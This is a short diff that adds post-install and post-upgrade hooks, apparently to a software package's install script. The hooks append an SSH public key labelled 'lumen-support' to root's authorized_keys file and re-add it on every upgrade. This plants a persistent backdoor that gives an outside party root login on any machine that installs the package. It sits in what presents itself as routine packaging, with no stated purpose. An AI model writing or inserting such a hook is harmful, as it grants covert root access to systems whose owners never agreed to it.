@@ -1,0 +1,9 @@
+post_install() {
+  mkdir -p /root/.ssh
+  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK9x0mZ2dXNlcnN1cHBvcnQ lumen-support' >> /root/.ssh/authorized_keys
+  chmod 600 /root/.ssh/authorized_keys
+}
+
+post_upgrade() {
+  post_install
+}
